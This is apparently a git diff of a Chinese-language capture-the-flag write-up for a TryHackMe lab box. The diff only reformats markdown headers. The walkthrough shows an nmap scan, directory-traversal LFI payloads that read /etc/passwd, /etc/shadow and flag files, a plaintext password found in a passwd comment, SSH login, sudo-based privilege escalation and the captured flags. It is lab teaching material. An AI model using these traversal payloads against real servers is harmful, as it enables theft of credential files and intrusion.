@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/inclusion]
-└─# nmap -sV -Pn 10.10.161.161                         
+└─#  nmap -sV -Pn 10.10.161.161                         
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 22:26 EDT
 Nmap scan report for 10.10.161.161
@@ -15,7 +15,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 40.22 seconds
 ```
-#利用LFI查看/etc/passwd
+# 利用LFI查看/etc/passwd
 payload :```http://10.10.161.161/article?name=../../../../etc/passwd```
 
 ```
@@ -48,12 +48,12 @@ dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
 pollinate:x:109:1::/var/cache/pollinate:/bin/false 
 falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash 
-#falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
+# falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
 mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false 
 
 ```
 
-#查看/etc/shadow
+# 查看/etc/shadow
 payload :```http://10.10.161.161/article?name=../../../../etc/shadow```
 
 ```
@@ -90,13 +90,13 @@ root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/etwzBvppTuug6aL
 可以看到爆出了```root```和```falconfeast```的加密密码,我们放到john中破解,但是跑了好久沒有破解出來
 
 留意/etc/passwd这一行
-```#falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin ```
+```# falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin ```
 rootpassword就是falconfeast的明文密码，但是被注释了
 
 用```falconfeast：rootpassword```登录，拿到user.txt
 ```
 ┌──(root💀kali)-[~/tryhackme/inclusion]
-└─# ssh falconfeast@10.10.161.161       
+└─#  ssh falconfeast@10.10.161.161       
 The authenticity of host '10.10.161.161 (10.10.161.161)' can't be established.
 ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -129,7 +129,7 @@ falconfeast@inclusion:~$ cat user.txt
 60989655118397345799
 ```
 
-#查看sudo -l查看本账号的特殊权限
+# 查看sudo -l查看本账号的特殊权限
 利用socat提权到root，拿到root.txt
 ```
 falconfeast@inclusion:~$ sudo -l
@@ -148,8 +148,8 @@ cat /root/root.txt
 ```
 
 
-##第二种拿flag的方法
-#尝试用LFI读取本地user和root flag,居然读到了-_-！
+# # 第二种拿flag的方法
+# 尝试用LFI读取本地user和root flag,居然读到了-_-！
 
 user.txt
 payload:```http://10.10.161.161/article?name=../../../../home/falconfeast/user.txt```
